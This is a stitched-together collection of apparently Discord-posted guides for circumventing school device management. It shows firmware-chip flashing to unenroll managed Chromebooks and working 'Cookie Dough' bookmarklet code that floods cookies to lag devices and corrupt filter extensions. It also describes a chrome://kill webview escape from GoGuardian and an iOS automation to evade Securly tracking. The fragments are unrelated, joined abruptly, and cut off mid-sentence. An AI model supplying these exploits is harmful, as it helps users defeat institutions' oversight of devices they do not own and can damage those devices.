Pull out all the cables and screws, be careful, don't break it. Flip the motherboard over and remove any cover or heatsink. Your chip is probably branded WINBOND or GIGADEVICE. Look for a chip with `W25Q64[xx]` or `W25Q128[xx]`. The W may or may not be there. The chip you are looking for should have 8 pins on it. If you're in doubt, post a picture here to get confirmation.\n\nStep 2: Once you have confirmed that you have the firmware chip, identify pin 1 by looking for an indent or mark on the chip. Now use the chart below to find the WP pin and the VCC pin. This chart might not be accurate to all chips, if you’re in doubt, you can google your chips name and find the spec sheet for it. Connect your conductive material to the WP pin, make sure it's connected well and isn't touching any of the other pins, then connect the other end to the VCC pin the same way. It is very important that you get the pins right, so don't mess up. I can't believe I have to say this, but don't desolder your chip.\n\nStep 3: power your Chromebook’s motherboard on, you’ll need to connect a charger. Open up sh1mmer‘s root shell and run `/usr/share/vboot/set_gbb_flags.sh 0x8090`. If the command says success, you did it right and can use <#1113336496494215219>  to unenroll.

If you don't want to buy items to deprovision your device, I suggest going to the SH1MMER/TN discord server instead to look for other methods\n# THIS GUIDE IS HARDER FOR PEOPLE WITH WSON-8 CHIPS AND IS VERY VERY RISKY FOR PEOPLE WITH WSON-8 CHIPS\n*why is it risky? well, since wson-8 chips have less exposed pins, you need to use a probe instead of a clip, which obviously does not clip compared to a clip, and therefore the chip could get disconnected anytime. i do not recommend this for people with wson-8 chips and attaching the probe to the chip to be very fair, you can modify a soic-8 chip clip to attach to a wson-8 chip, but im plain stupid and have no idea how to do that*\n\n-----------------------------------------\n\nHello! If you are reading this, you probably are interested in flashing the chromebook's chip probably because you want to unenroll it (the main purpose of this guide). I have decided to make this document because I took a really long while just to gather some information on chip flashing and so I have decided to share what I have found as a guide. (personally i feel the pencil bypass is way riskier and requires a shim whereas this method doesn't require a shim and has less risk involved. nevertheless, it is still risky)\n\n*if you have any issues with this, please DM me immediately*\nprobably has some because im writing this at 3am dont mind me <:trol:798936430976958524> \n\n------------------------------------------\n\n## Step 1: Obtaining Necessary Materials and Files\n### Materials\nFirst, you will need to buy a CH341a programmer that is basically a mini programmer that can read and program 24 and 24 series chips, as well as other microcontrollers, EEPROMs, and other memory chips. This is definitely a needed item in order to flash the chip.\n\nYou will also need a clip to clip onto the chip so that you can connect the programmer to the chip. For some chips, you might also need to have an adaptor that you can mount onto the programmer so that the computer can read and write on the chip.\n\nIn short terms, you will need\n\n- A CH341a USB flash programmer\n- A 1.8v adapter (needed for devices which use 1.8v flash chips.) (i dont know much about which chips need an adapter but I definitely know that GigaDevice chips need adapters)\n- An SOIC-8 chip clip(for soic-8 chips)\n- An WSON-8 chip probe(for wson-8 chips)\n- a pc with linux on it(x86_64 architecture)\n\n### Files to Download\nYou will need to download/have\n\n- flashrom\n- gbb_utility\n- [sh1mmer usb](https://darkn.bio/sh1mmer) (go find out urself u skid)\nflashrom should already be installed on the computer(assuming ur running linux). if its not installed **AND YOU ARE ON LINUX**, open the terminal and do:\n\n`sudo apt update`\n`sudo apt install flashrom`\non other distributions of linux? well go and find the command urself u stupid\nto install gbb utility, you need to download it from mrchromebox´s website. open your terminal and run:\n\n`wget https://mrchromebox.tech/files/util/gbb_utility.tar.gz 1 && tar -zxf gbb_utility.tar.gz`\n### Preparation for the flashing is done.

As of writing, I am currently holding my Chromebook back to v119, but my chrome browser is comfortably running on v120, and will receive all future updates as time goes on.\n\nIf you want to stick to an older version of CrOS but get the latest browser version (get the latest security/feature updates,) then you can use an OS flag called LaCrOS (Linux and ChromeOS.)

You can either have the default browser alongside the Lacros browser, or you can toggle the #lacros-only flag to only have the Lacros browser.\n    a) On older CrOS versions, you should probably install Lacros alongside the default browser because the feature most likely hasn't been developed that much yet, but you can try completely replacing the Lacros browser.\n    b) Keep in mind that not replacing the default browser makes it so that you have two Chrome icons in your app tray.

Being a rather old exploit it is **unclear** whether or not this still works with modern Securly. However this bookmarklet DOES work with **Hapara** currently and possibly more. It was initially leaked back when Trusted was a thing and well also the state of it being patched pretty much created the fun inactivity within Licenced today. Fun yoct experiment back when he was messing with blobs and attempting to just lag Chromebooks to death. **(old, old, old, OLD)**\n\nIn theory however this bookmarklet could apply for **all** extensions due to its corruption abilities after a powerwash.\n\n**Original (clears upon device signout):**\n```js\njavascript:for(let _=new Blob;;)document.cookie=URL.createObjectURL(_)+'='+URL.createObjectURL(_),URL.revokeObjectURL(_),Notification.requestPermission()\n```\n\n**Long Term (effects do not clear after signout):**\n```js\njavascript:var _;for(_=0;_<2e3;_++){let _=new Blob;document.cookie=URL.createObjectURL(_)+'='+URL.createObjectURL(_)+';expires='+new Date(2147483647e3).toUTCString(),URL.revokeObjectURL(_),Notification.requestPermission()}\n```\n\n**Extension Corruption (?):**\nThis process was an interesting process that Divide worked on. Essentially if you run Cookie Dough, remove your user or sign out after a powerwash there was a chance extensions would never load.

In theory it much more hidden than a traditional bookmarklet.\n\n1) Head to chrome://settings/searchEngines\n2) Create a Search Engine by using the Add buttom\n3) Paste the following values (you can change this!)\n--\nSearch engine: `examplescript`\nShortcut: `examplekeywordthatiwilltypeinanomnibox`\nURL with %s in place of query: `Paste any of the scripts above here OR any bookmarklet`\n--\n4) Then simply just type out \"examplekeywordthatiwilltypeinanomnibox\" in your URL address bar or parts of it; you will notice the epic behavior of it being linked directly to the pasted bookmarklet to run on whatever site\n\nSome devices may experience difficulties processing for loops hence why some users may prefer the Original version of Cookie Dough as it tends to be the least laggy on super low end Chromebooks. *(edited)*\nOnly ~160 cookies will actually save to each website, but thousands will show up in seconds upon click.

Also, this works on any extension that can open in a standalone window along with a browser. But this exploit is a webview, which lets you access a browser without filtering or certain polices active, and go to almost any site. For all of the skids who don't know that. \n\nProcess (For GoGuardian as an example) .First you need goguardian to open a standalone window, this can be done if your teacher has teacher chat open, or if your browsing is disabled. There are others ways to do this without teacher interference, but I will let you guys discover those. Now that the standalone window is open, Open a goguaridan extension page in the browser like `chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/chat.html` Next, on that page replace the URL with `chrome://kill` to crash Goguardian for a bit of time. Back in the goguardian standalone window you will get a browser error with a link that says `learn more`. Click this link and navigate from the chrome help page to the google privacy policy, then from there on, go to the footer of that page and click on the google link. Now you should be on the google home page and no extensions will effect it. To navigate this \"browser\" use the reload, back and forward arrow buttons on your Chromebook, if your not on a chromebook, figure it out. You are also signed out on this page so its like an incognito window that saves nothing. If you close this window, the webview exploit can only be redone if your browsing is re-disabled or your teacher opens back up the chat. Assuming there are not other ways to force goguaridan to open in a standalone window. This process, except the teacher chat and browsing disabled windows, is the same for any extension that can be opened in a standalone window.

I have found a method to stop your history being tracked (for Securly users) and unblock google signin and services around it (remote desktop, colabratory, etc.).\n\nThis is an iOS kajig tested on a school-restricted iPad (7th generation) . It is pretty much a better and faster version of the Google Sign-in kaijig that was posted here a while back. It takes only about 3 seconds to do once you get everything set up.\n\nFor this method, you need to have two unblocked apps. Chrome and the shortcuts app. This may work with Safari, I have not tested it yet.\nFirst, make sure you are signed out. To test this, make a search and see if it prompts you to sign in to Securly. You should do this in an Incognito tab. If it does not prompt you, close all incognito tabs.\nAlright, time for the method!\n\nOpen the shortcuts app and click \"Automation\" on the top left.\nClick the little plus icon and click \"Create Personal Automation\"\nScroll down and click \"App\" and choose \"Chrome\" \"Is Opened\" and hit next.\nClick add action and search for \"Chrome\". Tap it and add \"Open URLs in Chrome in Incognito\"\nClick the URL box and put in `https://t3rm1n.ml`. It is my site I made for this method with a bunch of links, you can use another link if you wish.\nTap next,  and uncheck \"Ask Before Running\". Then click done.\nNow, whenever you run Chrome, it will open the link (t3rm1n.ml) with the ability sign in Google-run sites as well as avoid your history being linked with you (if you use securly). They will not even be able to see you were on t3rm1n.ml or whatever site you put in.\n\nYour history may be unliked with you if you use a different filter, but I have only tested Securly.\n\n(P.S.
